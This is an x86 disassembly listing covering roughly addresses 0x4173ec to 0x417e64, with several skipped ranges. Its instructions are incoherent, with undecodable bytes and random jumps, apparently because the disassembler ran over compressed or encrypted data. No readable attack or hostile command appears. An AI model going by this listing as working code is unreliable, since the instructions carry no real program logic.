  4173ec:	add    BYTE PTR [eax],al
  4173ee:	ret    
  4173ef:	jmp    0x417388
  4173f1:	inc    esi
  4173f2:	adc    al,0x2c
  4173f4:	push   cs
  4173f5:	jb     0x4173cf
  4173f7:	pop    ebx
  4173f8:	fdiv   QWORD PTR ds:0x5d777655
  4173fe:	adc    al,0x2f
  417400:	mov    eax,0x56a0f14e
  417405:	pop    ebp
  417406:	fstp   TBYTE PTR [edi+ebp*2-0x5be7c7cc]
  41740d:	xor    esi,ecx
  41740f:	jno    0x417423
  417411:	imul   ebp,DWORD PTR [ecx+0x24f3313b],0xffffffe8
  417418:	out    dx,eax
  417419:	fdivr  QWORD PTR [esi-0x2323ff71]
  41741f:	push   ebp
  417420:	inc    eax
  417421:	sbb    esi,DWORD PTR [ebx]
  417423:	xor    BYTE PTR [eax],0x51
  417426:	and    DWORD PTR ds:0x728659c2,ecx
  41742c:	enter  0xcfab,0xc5
  417430:	mov    edx,0xd8c57cf0
  417435:	inc    ebp
  417436:	inc    edx
  417437:	rcl    bh,0x8
  41743a:	add    eax,0xcca51b01
  41743f:	(bad)  
  417440:	out    0xb5,al
  417442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417443:	mov    al,ds:0x9f7def39
  417448:	mov    DWORD PTR [ebp+edx*2+0x11015106],0xb4bc9713
  417453:	or     eax,0x6e
  417456:	mov    DWORD PTR [eax+0x43],eax
  417459:	push   0x39
  41745b:	es daa 
  41745d:	dec    ebx
  41745e:	xchg   esi,eax
  41745f:	mov    ds:0xf80eb3bd,al
  417464:	rcl    BYTE PTR [esi+0x7e],0x57
  417468:	leave  
  417469:	imul   ebp,DWORD PTR [edx-0x485d6522],0x0
  417470:	jge    0x417475
  417472:	xor    ch,BYTE PTR [eax]
  417474:	lahf   
  417475:	adc    bl,al
  417477:	je     0x41743b
  417479:	cs xor dh,cl
  41747c:	push   ebx
  41747d:	or     DWORD PTR [eax],ecx
  41747f:	data16 js 0x41748d
  417482:	pop    esp
  417483:	int3   
  417484:	test   eax,0x4f49f085
  417489:	addr16 cld 
  41748b:	sbb    eax,DWORD PTR [ecx+0x17]
  41748e:	mov    edx,0x15e1af49
  417493:	icebp  
  417494:	leave  
  417495:	loop   0x417423
  417497:	sub    eax,0xa19c1ec3
  41749c:	popa   
  41749d:	jp     0x41745b
  41749f:	sbb    ch,BYTE PTR [edi-0x3266beca]
  4174a5:	out    dx,eax
  4174a6:	push   ds
  4174a7:	mov    ds,ebx
  4174a9:	stos   DWORD PTR es:[edi],eax
  4174aa:	adc    eax,0xafd02257
  4174af:	dec    ebx
  4174b0:	dec    edi
  4174b1:	add    DWORD PTR [eax+0x61],edx
  4174b4:	clc    
  4174b5:	out    0x26,eax
  4174b7:	jle    0x4174a0
  4174b9:	sub    edi,ebp
  4174bb:	daa    
  4174bc:	sbb    al,0x7c
  4174be:	sub    eax,DWORD PTR [esi]
  4174c0:	sbb    DWORD PTR [ebx-0x1c],0x188659e4
  4174c7:	sbb    BYTE PTR [edx+0x56],bl
  4174ca:	mov    ebx,0xd38f9802
  4174cf:	mov    cl,0xdd
  4174d1:	dec    ebx
  4174d2:	test   eax,0xa3c3b2c2
  4174d7:	aaa    
  4174d8:	mov    BYTE PTR [esi],bh
  4174da:	fsub   QWORD PTR [eax]
  4174dc:	(bad)  
  4174dd:	in     al,dx
  4174de:	pop    ss
  4174df:	clc    
  4174e0:	push   es
  4174e1:	and    ecx,esi
  4174e3:	xchg   esp,eax
  4174e4:	jle    0x41749f
  4174e6:	or     eax,0x8fcf7b86
  4174eb:	retf   0x6f4
	...
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	iret   
  417563:	int3   
  417564:	aas    
  417565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	shl    DWORD PTR [edi],1
  417570:	lods   al,BYTE PTR ds:[esi]
  417571:	dec    edi
  417572:	sub    BYTE PTR [ebx-0x4e5adf60],ah
  417578:	ficomp DWORD PTR [eax+0x4c5e8ed6]
  41757e:	push   cs
  41757f:	aaa    
  417580:	sub    dl,ah
  417582:	mov    edi,0x58a79402
  417587:	push   esi
  417588:	rcr    dl,1
  41758a:	mov    dl,0xbd
  41758c:	sub    edx,DWORD PTR [ebx+0x43d61cfc]
  417592:	dec    esp
  417593:	dec    ebx
  417594:	dec    esp
  417595:	inc    ebp
  417596:	push   ss
  417597:	sbb    eax,0x3411ed9e
  41759c:	repz pop edi
  41759e:	mov    ecx,0x1569fc7e
  4175a3:	ret    0x45ef
  4175a6:	repnz cld 
  4175a8:	xchg   esp,eax
  4175a9:	or     ch,al
  4175ab:	popa   
  4175ac:	add    al,0xab
  4175ae:	loope  0x41753b
  4175b0:	stos   BYTE PTR es:[edi],al
  4175b1:	push   ss
  4175b2:	jle    0x41760c
  4175b4:	fbld   TBYTE PTR [ebp+0x74a5a819]
  4175ba:	push   esp
  4175bb:	push   edi
  4175bc:	or     BYTE PTR [edx-0x6f],0x32
  4175c0:	cdq    
  4175c1:	fwait
  4175c2:	jbe    0x4175a1
  4175c4:	mov    eax,ds:0x5ee3f02f
  4175c9:	ficomp WORD PTR [edx-0x78]
  4175cc:	aas    
  4175cd:	out    0xc3,al
  4175cf:	push   edx
  4175d0:	sahf   
  4175d1:	fnstsw WORD PTR [edi+0x25570324]
  4175d7:	xlat   BYTE PTR ds:[ebx]
  4175d8:	push   0x3613a1a6
  4175dd:	or     al,0x23
  4175df:	(bad)  
  4175e0:	xchg   ecx,eax
  4175e1:	or     eax,edx
  4175e3:	mov    bh,0x11
  4175e5:	in     al,dx
  4175e6:	xor    DWORD PTR [edi],ebx
  4175e8:	cwde   
  4175e9:	out    0xed,al
  4175eb:	fadd   QWORD PTR [ecx-0x44e9a74c]
  4175f1:	test   BYTE PTR [ebx],ah
  4175f3:	icebp  
  4175f4:	xchg   edi,eax
  4175f6:	in     eax,dx
  4175f7:	test   eax,0x59529c65
  4175fc:	xchg   ecx,eax
  4175fd:	retf   
  4175fe:	jne    0x417669
  417600:	aas    
  417601:	sub    al,0xb6
  417603:	sbb    esp,ecx
  417605:	inc    eax
  417606:	repnz out 0xae,al
  417609:	jo     0x41763d
  41760b:	xlat   BYTE PTR ds:[ebx]
  41760c:	sub    dh,bl
  41760e:	in     eax,0x6f
  417610:	or     eax,0x20937895
  417615:	inc    esp
  417617:	and    bl,BYTE PTR [ebx+eiz*2-0x329e1034]
  41761e:	sbb    al,0x37
  417620:	jbe    0x417652
  417622:	xchg   ecx,eax
  417623:	ret    
  417624:	add    eax,0x4c11a1ae
  417629:	mov    ebp,0xe8b10f76
  41762e:	sbb    eax,0x141b539d
  417633:	sbb    DWORD PTR [esi],edi
  417635:	sub    esi,DWORD PTR ds:0x34ed68b8
  41763b:	repz adc BYTE PTR [edi+0x665bf1d5],cl
  417642:	mov    dl,0x31
  417644:	xor    eax,0x9d3a3593
  417649:	xchg   edi,eax
  41764a:	push   esp
  41764b:	cli    
  41764c:	push   0x97021ea1
  417651:	sti    
  417652:	mov    BYTE PTR [ebx],dl
  417654:	mov    eax,ds:0xe8ff7b79
  417659:	pop    edx
  41765a:	aam    0xf9
  41765c:	xchg   esp,eax
  41765d:	(bad)  
  41765e:	ins    BYTE PTR es:[edi],dx
  41765f:	mov    dh,0x14
  417661:	inc    ebp
  417662:	jbe    0x4176a9
  417664:	popf   
  417665:	mov    ds:0xc5206e30,al
  41766a:	loope  0x4176b8
  41766c:	sbb    al,0xb0
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fisub  DWORD PTR [ecx+ebp*4]
  4176e4:	test   DWORD PTR [esi+0x67],esp
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	fiadd  DWORD PTR [ebx-0x56]
  4176f1:	sub    DWORD PTR [edi-0x5e],eax
  4176f4:	loopne 0x417681
  4176f6:	dec    edi
  4176f7:	jnp    0x4176a3
  4176f9:	cld    
  4176fa:	or     eax,DWORD PTR [edx]
  4176fc:	mov    ds,WORD PTR [edi+0x529f9857]
  417702:	test   al,0x38
  417704:	icebp  
  417705:	sbb    al,BYTE PTR [eax+0x6c]
  417708:	xor    BYTE PTR [edi],ch
  41770a:	fnsave [esi]
  41770c:	lods   al,BYTE PTR ds:[esi]
  41770d:	jg     0x4176ad
  41770f:	jns    0x417754
  417711:	sub    eax,0x7158749
  417716:	or     ebx,0xffffff94
  417719:	mov    BYTE PTR [eax],al
  41771b:	xchg   esp,eax
  41771c:	mov    esi,0x139a5c9e
  417721:	sbb    DWORD PTR [ecx+0x70],0x59
  417725:	mov    fs,WORD PTR [edx]
  417727:	jl     0x4176b0
  417729:	xchg   ecx,eax
  41772a:	ss mov al,0xf0
  41772d:	int3   
  41772e:	lahf   
  41772f:	mov    DWORD PTR [edx-0x63],esi
  417732:	ja     0x417753
  417734:	aam    0x60
  417736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417737:	adc    al,0xc0
  417739:	add    DWORD PTR [edx],ebp
  41773b:	out    dx,eax
  41773c:	pop    ebp
  41773d:	or     BYTE PTR [esp+edx*1-0x67d0dc95],al
  417744:	mov    al,0x44
  417746:	js     0x417733
  417748:	scas   eax,DWORD PTR es:[edi]
  417749:	lock nop
  41774b:	ins    DWORD PTR es:[edi],dx
  41774c:	push   edx
  41774d:	push   esi
  41774e:	bound  edi,QWORD PTR [edx+ecx*2-0x1ac1f34f]
  417755:	cmp    DWORD PTR [edi+0x4af1559e],0x15b73fc2
  41775f:	pop    esp
  417760:	sti    
  417761:	icebp  
  417762:	nop
  417763:	cs nop
  417765:	lods   eax,DWORD PTR es:[esi]
  417767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417768:	(bad)  
  41776a:	cs push cs
  41776c:	jge    0x4176fe
  41776e:	or     dh,BYTE PTR [edi+0xea6de4b]
  417774:	push   ss
  417775:	push   es
  417776:	fwait
  417777:	adc    eax,0x7112aedc
  41777c:	pop    ebx
  41777d:	adc    eax,0x46729bef
  417782:	pop    ebp
  417783:	sahf   
  417784:	es sbb al,0x20
  417787:	push   ds
  417788:	sbb    BYTE PTR [ecx],ch
  41778a:	(bad)  
  41778b:	scas   eax,DWORD PTR es:[edi]
  41778c:	or     bh,dh
  41778e:	adc    al,0x24
  417790:	pop    ebx
  417791:	div    BYTE PTR [eax-0x3e]
  417794:	fmul   st,st(1)
  417796:	push   ecx
  417797:	js     0x417773
  417799:	pop    eax
  41779b:	data16 sbb ch,BYTE PTR [eax-0x2e2a8a54]
  4177a2:	js     0x417725
  4177a4:	retf   
  4177a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a6:	mov    esp,0xe1c1aa7f
  4177ab:	fisubr WORD PTR [ecx-0x30]
  4177ae:	aas    
  4177af:	stos   BYTE PTR es:[edi],al
  4177b0:	or     edi,DWORD PTR [edx+0x5b]
  4177b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b4:	lahf   
  4177b5:	dec    edx
  4177b6:	enter  0x1d2c,0x46
  4177ba:	mov    ch,0x5d
  4177bc:	aaa    
  4177bd:	push   eax
  4177be:	adc    eax,0x794d9d01
  4177c3:	fimul  DWORD PTR [edx-0x3d0c14fb]
  4177c9:	test   al,0xb9
  4177cb:	imul   ebp,DWORD PTR [ebx-0xad87987],0xffffff9a
  4177d2:	enter  0x5cfa,0xc6
  4177d6:	push   ss
  4177d7:	rcr    dl,cl
  4177d9:	retf   
  4177da:	rep ins DWORD PTR es:[edi],dx
  4177dc:	inc    edi
  4177dd:	pop    esp
  4177de:	sti    
  4177df:	xchg   DWORD PTR [ecx-0x7b68467],esp
  4177e5:	xchg   DWORD PTR [ecx*4+0x135ac597],ebx
  4177ec:	das    
  4177ed:	jne    0x4177ef
	...
  417853:	add    BYTE PTR [eax],al
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	rcl    BYTE PTR [ebx],cl
  417863:	or     ch,cl
  417865:	loop   0x4178ce
  417867:	std    
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	test   DWORD PTR [ecx-0xf6d2a91],eax
  417874:	sbb    BYTE PTR [eax],ch
  417876:	add    eax,0xdc8e1198
  41787b:	dec    ecx
  41787c:	in     eax,dx
  41787d:	lods   eax,DWORD PTR ds:[esi]
  41787e:	add    DWORD PTR ds:0x23dfd1dd,ebp
  417884:	jbe    0x41787b
  417886:	lea    eax,[edx]
  417888:	xchg   ebp,eax
  417889:	test   BYTE PTR [esi+0x7661ba39],al
  41788f:	dec    esp
  417890:	xchg   esi,eax
  417891:	outs   dx,DWORD PTR ds:[esi]
  417892:	xchg   ecx,eax
  417893:	jo     0x41786a
  417895:	xor    BYTE PTR [esi+edi*1-0x332d7289],bl
  41789c:	mov    si,0xc5f1
  4178a0:	add    BYTE PTR [edx+0x34b94780],dl
  4178a6:	pop    ss
  4178a7:	pop    edx
  4178a8:	cmp    ch,BYTE PTR [edx+0x4d89ec0e]
  4178ae:	jmp    0x709a560b
  4178b3:	cwde   
  4178b4:	icebp  
  4178b5:	push   eax
  4178b6:	popf   
  4178b7:	mov    WORD PTR [eax],?
  4178b9:	imul   esp,ebx,0x6c1a5174
  4178bf:	shl    esp,cl
  4178c1:	jmp    0x8c14606f
  4178c6:	gs xchg edi,eax
  4178c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178c9:	hlt    
  4178ca:	sub    ecx,DWORD PTR [ebx]
  4178cc:	jl     0x417921
  4178ce:	mov    bl,0x42
  4178d0:	push   edx
  4178d1:	fcompp 
  4178d3:	je     0x4178c6
  4178d5:	mov    ch,0x40
  4178d7:	and    al,0x16
  4178d9:	dec    ebp
  4178da:	(bad)  
  4178db:	dec    esp
  4178dc:	sbb    dh,BYTE PTR [edx-0x30474236]
  4178e2:	(bad)  
  4178e3:	sub    esi,ecx
  4178e5:	inc    ecx
  4178e6:	int    0x78
  4178e8:	ins    DWORD PTR es:[edi],dx
  4178e9:	xor    al,0x4f
  4178eb:	test   BYTE PTR [edx],ah
  4178ed:	sahf   
  4178ee:	inc    edi
  4178ef:	add    edi,DWORD PTR [edx]
  4178f1:	arpl   WORD PTR [edx],bx
  4178f3:	(bad)  
  4178f4:	lods   al,BYTE PTR ds:[esi]
  4178f5:	push   0xb319777f
  4178fa:	cmp    DWORD PTR [ebp-0x346efb46],eax
  417900:	and    eax,0x3db4c4df
  417905:	inc    edx
  417906:	xor    BYTE PTR [edx+0x7f],al
  417909:	pop    edx
  41790a:	add    DWORD PTR [ecx],esi
  41790c:	jmp    0x4178bc
  41790e:	lds    esi,FWORD PTR [ebp+ecx*2-0x2f]
  417912:	mov    esi,0xc9091b43
  417917:	prefetchwt1 BYTE PTR [ebx]
  41791a:	mov    dh,BYTE PTR ds:0x9b065086
  417920:	cmp    al,0x6a
  417922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417923:	ds stos DWORD PTR es:[edi],eax
  417925:	xor    al,0x9a
  417927:	xor    eax,0x875b93ce
  41792c:	fldenv [eax+0x6dec0faf]
  417932:	xchg   edx,eax
  417933:	or     BYTE PTR [edx-0x5],al
  417936:	jecxz  0x417956
  417938:	or     BYTE PTR [ebx],cl
  41793a:	aad    0xbd
  41793c:	cmp    BYTE PTR [esi+ebx*2],0x1b
  417940:	daa    
  417941:	and    eax,0xc270c709
  417946:	mov    cl,0xc2
  417948:	ret    
  417949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41794a:	rol    DWORD PTR [edx-0x1c],0xf0
  41794e:	mov    ds:0xef22ea73,eax
  417953:	mov    dl,0x7f
  417955:	int    0x7e
  417957:	cmp    al,0xa1
  417959:	mov    dh,0xc0
  41795b:	push   eax
  41795c:	inc    esi
  41795d:	pop    ds
  41795e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41795f:	sub    eax,0x1fafd8d3
  417964:	mov    esp,0x22aa9485
  417969:	jmp    0x97999d70
	...
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	jo     0x4179e2
  4179e4:	nop
  4179e5:	loope  0x417a4e
  4179e7:	inc    BYTE PTR [eax]
  4179e9:	add    BYTE PTR [eax],al
  4179eb:	add    DWORD PTR [eax],eax
  4179ed:	add    BYTE PTR [edi],cl
  4179ef:	and    DWORD PTR [ebx],ebp
  4179f1:	data16 xchg BYTE PTR [edi-0x1a4ca73b],dl
  4179f8:	ret    0x9b47
  4179fb:	push   cs
  4179fc:	pop    ebx
  4179fd:	aaa    
  4179fe:	mov    cl,0xfa
  417a00:	inc    eax
  417a01:	in     al,0x5
  417a03:	and    cl,BYTE PTR [edi-0x41cff870]
  417a09:	fisub  DWORD PTR [edi+0x5afce0d2]
  417a0f:	cwde   
  417a10:	mov    ebp,0x261e0f10
  417a15:	push   esi
  417a16:	jmp    0x5b64aee4
  417a1b:	fisubr DWORD PTR [edx+0x7c]
  417a1e:	jl     0x417a0a
  417a20:	outs   dx,BYTE PTR ds:[esi]
  417a21:	icebp  
  417a22:	mov    edi,0x6059a59c
  417a27:	mov    edi,0x41142847
  417a2c:	cmp    bh,ch
  417a2e:	mov    ebx,0x386b7b75
  417a33:	adc    ebp,esp
  417a35:	cld    
  417a36:	test   al,0xa1
  417a38:	call   0xfb33:0xc68516d1
  417a3f:	xor    bl,ch
  417a41:	arpl   WORD PTR es:[ebx+0x1a8f10aa],bx
  417a48:	cmp    esp,DWORD PTR [edx-0x66]
  417a4b:	adc    BYTE PTR ds:0x57211d52,0xd2
  417a52:	and    al,0x5b
  417a54:	scas   al,BYTE PTR es:[edi]
  417a55:	popa   
  417a56:	fs nop
  417a58:	gs inc edx
  417a5a:	add    al,0xdd
  417a5c:	pop    esp
  417a5d:	(bad)  
  417a5e:	dec    esi
  417a5f:	add    DWORD PTR [eax+0x4b],eax
  417a62:	dec    ebx
  417a63:	loopne 0x417a92
  417a65:	adc    DWORD PTR [edx+edx*8-0x7e028304],ebp
  417a6c:	gs cmp eax,0xf8f7abfe
  417a72:	ror    esi,cl
  417a74:	shr    DWORD PTR [edi-0x12815ddf],1
  417a7a:	xchg   DWORD PTR [edi-0x2d],ebx
  417a7d:	cs mov al,0xa3
  417a80:	test   DWORD PTR [ecx-0x101f7cf],edx
  417a86:	and    eax,0xef96e350
  417a8b:	fisub  DWORD PTR [ebx]
  417a8d:	dec    esp
  417a8e:	into   
  417a8f:	ror    BYTE PTR [ecx+0x74],0x75
  417a93:	leave  
  417a94:	(bad)  
  417a95:	mov    bl,0x12
  417a97:	dec    edx
  417a98:	shl    ah,0xa6
  417a9b:	inc    edi
  417a9c:	scas   al,BYTE PTR es:[edi]
  417a9d:	mov    BYTE PTR [edi-0x7befbc03],cl
  417aa3:	xlat   BYTE PTR ds:[ebx]
  417aa4:	outs   dx,DWORD PTR ds:[esi]
  417aa5:	cmp    BYTE PTR [ecx+0x42],0x14
  417aa9:	xchg   ecx,eax
  417aaa:	inc    esp
  417aab:	adc    al,0xe3
  417aad:	sub    al,0x58
  417aaf:	dec    eax
  417ab0:	fistp  WORD PTR [esi+0x18247f96]
  417ab6:	ins    BYTE PTR es:[edi],dx
  417ab7:	in     eax,dx
  417ab8:	lahf   
  417ab9:	out    0x5d,eax
  417abb:	int    0xde
  417abd:	push   ds
  417abe:	fisubr WORD PTR [ecx+eax*4]
  417ac1:	fcmovnbe st,st(0)
  417ac3:	sbb    DWORD PTR [ebp+edi*2+0x23c600a1],ecx
  417aca:	or     BYTE PTR [ebp+0x5c],ah
  417acd:	cld    
  417ace:	and    edi,edx
  417ad0:	mov    ebx,0x4d5b6a5b
  417ad5:	adc    dl,BYTE PTR [eax]
  417ad7:	adc    al,0x7e
  417ad9:	retf   
  417ada:	fld    QWORD PTR [ebx-0x74]
  417add:	cmp    DWORD PTR [ebx+0xb3e666],ecx
  417ae3:	dec    edx
  417ae4:	mov    dl,bl
  417ae6:	cli    
  417ae7:	es pop edx
  417ae9:	inc    ecx
  417aea:	loopne 0x417b02
  417aec:	jl     0x417b2c
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x164acf5e]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [ebx],cl
  417b6f:	out    0x68,al
  417b71:	repnz xchg ecx,ebx
  417b74:	cmp    DWORD PTR [edi+ebp*1],edx
  417b77:	cld    
  417b78:	xchg   edi,eax
  417b79:	mov    ecx,0xbd27febf
  417b7e:	mov    edi,0x23dd45c4
  417b83:	sbb    eax,0xa05a2914
  417b88:	int3   
  417b89:	sti    
  417b8a:	popa   
  417b8b:	(bad)  
  417b8c:	jle    0x417bd9
  417b8e:	push   cs
  417b8f:	mov    DWORD PTR [esi-0x2cd9ae9f],edx
  417b95:	in     al,dx
  417b96:	sbb    al,BYTE PTR [ecx]
  417b98:	mov    bh,0x86
  417b9a:	mul    BYTE PTR [eax-0x19]
  417b9d:	dec    eax
  417b9e:	jmp    0x417e:0x5326b9bd
  417ba5:	xchg   esp,eax
  417ba6:	inc    esi
  417ba7:	mov    BYTE PTR [edx+0x2],dh
  417baa:	mov    edx,0x3032c952
  417baf:	test   BYTE PTR [ebp-0x7d],cl
  417bb2:	stos   BYTE PTR es:[edi],al
  417bb3:	jmp    0x142cedd6
  417bb8:	cwde   
  417bb9:	mov    ch,0xb
  417bbb:	or     al,ch
  417bbd:	ja     0x417bab
  417bbf:	(bad)  
  417bc0:	xchg   ecx,eax
  417bc1:	or     al,0x8e
  417bc3:	into   
  417bc4:	adc    bh,BYTE PTR [edx+0x6f]
  417bc7:	and    ah,BYTE PTR [ecx+ecx*4-0x7fb0c0b5]
  417bce:	pop    ds
  417bcf:	retf   
  417bd0:	fcomp  QWORD PTR [ebx+0x35]
  417bd3:	xor    cl,BYTE PTR [edi]
  417bd5:	loopne 0x417bc0
  417bd7:	dec    edi
  417bd8:	fistp  WORD PTR [edx-0x14d8130c]
  417bde:	ret    
  417bdf:	aas    
  417be0:	(bad)  
  417be2:	rcr    BYTE PTR ds:0x98cedc4e,cl
  417be8:	sub    eax,0x9553ab98
  417bed:	or     bl,dl
  417bef:	ror    DWORD PTR [esi+0x3],0x32
  417bf3:	pop    es
  417bf4:	int3   
  417bf5:	arpl   WORD PTR [eax],sp
  417bf7:	xor    eax,0x6a45c8c3
  417bfc:	loope  0x417bae
  417bfe:	mov    cl,0x3c
  417c00:	cmp    BYTE PTR [eax-0x1e],dh
  417c03:	dec    esp
  417c04:	push   0xdfbaca96
  417c09:	test   BYTE PTR [edi-0xee23ef4],bh
  417c0f:	sbb    eax,0x8f3a81fb
  417c14:	mov    BYTE PTR [ecx-0x2a],ah
  417c17:	lahf   
  417c18:	(bad)  
  417c19:	dec    edi
  417c1a:	nop
  417c1b:	loopne 0x417bb0
  417c1d:	dec    esi
  417c1e:	pop    ds
  417c1f:	cmc    
  417c20:	lds    edx,FWORD PTR [eax-0x80]
  417c23:	mov    eax,0xbbdc5738
  417c28:	mul    DWORD PTR [edi+ecx*4+0xeafbe57]
  417c2f:	scas   eax,DWORD PTR es:[edi]
  417c30:	mov    WORD PTR [eax+ebp*1+0x48994a07],gs
  417c37:	dec    edx
  417c38:	cld    
  417c39:	jg     0x417bff
  417c3b:	mov    fs:0xe16d89b9,eax
  417c41:	lods   eax,DWORD PTR ds:[esi]
  417c42:	inc    ebp
  417c43:	pusha  
  417c44:	xor    al,BYTE PTR ds:0xa71bcb5d
  417c4a:	aad    0xc4
  417c4c:	cmp    DWORD PTR [edx+ebp*8-0x3ae4ec4],ebx
  417c53:	ins    BYTE PTR es:[edi],dx
  417c54:	and    ch,BYTE PTR ds:0xb83eb6f9
  417c5a:	mov    esi,0xbe568c53
  417c5f:	adc    BYTE PTR [ecx],dh
  417c61:	xor    eax,0x1d73f2a0
  417c66:	mov    edx,0x23615e8c
  417c6b:	mov    ecx,0x7ce2
	...
  417cd4:	add    BYTE PTR [eax],al
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0xe7
  417ce3:	xchg   edi,eax
  417ce4:	es lahf 
  417ce6:	add    BYTE PTR [bx+di],al
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    BYTE PTR [esi+eiz*4],al
  417cf0:	cli    
  417cf1:	daa    
  417cf2:	dec    edi
  417cf3:	jnp    0x417d73
  417cf5:	dec    esp
  417cf6:	jne    0x417cc2
  417cf8:	arpl   WORD PTR [ebp+0x37],cx
  417cfb:	fild   WORD PTR [edi+0x48be9bde]
  417d01:	sub    DWORD PTR [edx],0x2efdc7d8
  417d07:	nop
  417d08:	cmc    
  417d09:	fild   DWORD PTR [esi-0x54]
  417d0c:	sahf   
  417d0d:	add    al,0x3d
  417d0f:	cmp    al,0x4e
  417d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d12:	xchg   ecx,eax
  417d13:	pop    DWORD PTR [ebx]
  417d15:	scas   eax,DWORD PTR es:[edi]
  417d16:	fld    QWORD PTR [eax-0x6a]
  417d19:	lods   eax,DWORD PTR ds:[esi]
  417d1a:	popa   
  417d1b:	dec    ebp
  417d1c:	sbb    BYTE PTR [edi],bl
  417d1e:	push   ebp
  417d1f:	xchg   edi,eax
  417d20:	std    
  417d21:	or     ecx,DWORD PTR [ebx+0x6fc5f8d]
  417d27:	imul   edi,DWORD PTR [eax+0x6b],0x28
  417d2b:	xchg   edx,eax
  417d2c:	test   BYTE PTR [eax],dh
  417d2e:	xor    BYTE PTR fs:[eax+0x58],bh
  417d32:	or     eax,0x473d9fe8
  417d37:	xlat   BYTE PTR ds:[ebx]
  417d38:	scas   eax,DWORD PTR es:[edi]
  417d39:	test   BYTE PTR ds:0x1aee5651,bl
  417d3f:	hlt    
  417d40:	sub    dl,BYTE PTR [ebp-0x4be16bf7]
  417d46:	out    0xb0,al
  417d48:	inc    esi
  417d49:	pop    ecx
  417d4a:	fs mov bh,0x2c
  417d4d:	inc    ebp
  417d4e:	mov    esi,ebp
  417d50:	jle    0x417dba
  417d52:	adc    dh,bh
  417d54:	pop    ebp
  417d55:	xchg   ecx,eax
  417d56:	adc    cl,BYTE PTR [edi-0xc644a0e]
  417d5c:	jmp    0x2192:0xbf6ecf8e
  417d63:	arpl   sp,dx
  417d65:	leave  
  417d66:	in     al,0x53
  417d68:	xchg   ebx,eax
  417d69:	pop    edx
  417d6a:	sahf   
  417d6b:	push   0xc2744da5
  417d70:	dec    esi
  417d71:	and    dh,BYTE PTR [bx+0x1b]
  417d75:	pop    edx
  417d76:	add    edx,DWORD PTR [ecx]
  417d78:	mov    ds:0xc388dc5f,al
  417d7d:	sahf   
  417d7e:	js     0x417db0
  417d80:	lock mov dh,0x7c
  417d83:	push   ecx
  417d84:	test   eax,0xe8ed011b
  417d89:	je     0x417d82
  417d8b:	jae    0x417d80
  417d8d:	or     esi,esi
  417d8f:	xchg   esi,eax
  417d90:	fcmovne st,st(3)
  417d92:	vmovhpd xmm0,xmm4,QWORD PTR [ebp+0xecd5133]
  417d9a:	adc    bl,BYTE PTR [ecx+0xb]
  417d9d:	jo     0x417d5d
  417d9f:	sub    eax,0x884c2a98
  417da4:	or     al,0x51
  417da6:	dec    esp
  417da7:	mov    DWORD PTR [ebp-0x45],ecx
  417daa:	ret    0xa477
  417dad:	fldcw  WORD PTR [ebx]
  417daf:	jb     0x417d56
  417db1:	das    
  417db2:	ret    0x590a
  417db5:	fsub   QWORD PTR [ebx+0x6e571b30]
  417dbb:	pusha  
  417dbc:	test   al,0x6b
  417dbe:	sub    BYTE PTR [esi-0x1d11dce2],bl
  417dc4:	ret    0xde3a
  417dc7:	jecxz  0x417dda
  417dc9:	fdiv   QWORD PTR [esi+0x55edf983]
  417dcf:	jno    0x417daa
  417dd1:	scas   al,BYTE PTR es:[edi]
  417dd2:	rol    BYTE PTR [ecx],cl
  417dd4:	inc    edi
  417dd5:	xor    ebp,DWORD PTR [ecx-0x1badbf7d]
  417ddb:	push   ds
  417ddc:	enter  0x43cd,0x99
  417de0:	enter  0xf946,0x6d
  417de4:	pusha  
  417de5:	daa    
  417de6:	pusha  
  417de7:	test   DWORD PTR [ebp+0x4d7a2a2f],0x8a
	...
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	dec    esi
  417e63:	iret   
  417e64:	shl    al,1
